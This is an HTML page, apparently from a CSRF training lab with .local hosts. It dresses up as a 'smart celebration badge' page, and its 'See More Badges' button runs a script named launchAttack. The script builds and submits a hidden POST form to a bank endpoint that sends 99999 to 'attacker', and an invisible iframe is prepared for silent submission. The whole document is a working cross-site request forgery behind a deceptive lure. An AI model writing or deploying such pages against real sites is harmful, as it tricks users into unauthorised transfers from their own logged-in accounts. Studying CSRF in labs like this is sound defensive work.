<!DOCTYPE html>
<html>
<head><title>Smart Badges</title></head>
<body>
    <h2>Look at this smart celebration badge!</h2>
    <img src="http://csrf.attacker.local/img/badge.jpg" height="50px" width="50px" alt="Badge Celebration "><br><br>

    <button onclick="launchAttack()">Click to See More Badges!</button>
    <p id="status">Status</p>

    <!-- Invisible iframe to send the request silently -->
    <iframe name="hidden_iframe" style="display:none;" id="hidden_iframe">
    </iframe>   
    <script>
      function launchAttack() {
        const form = document.createElement("form");
        form.method = "POST";
        form.action = "https://csrf.bank.local/csrf/bank.php";  
	//form.target = "hidden_iframe"; 

        const to = document.createElement("input");
        to.type = "hidden";
        to.name = "to";
        to.value = "attacker";

        const amount = document.createElement("input");
        amount.type = "hidden";
        amount.name = "amount";
        amount.value = "99999";

        form.appendChild(to);
        form.appendChild(amount);
        document.body.appendChild(form);
        form.submit();

	document.getElementById('status').innerHTML = "Request submitted! ";
      }
 </script>
</body>
</html>
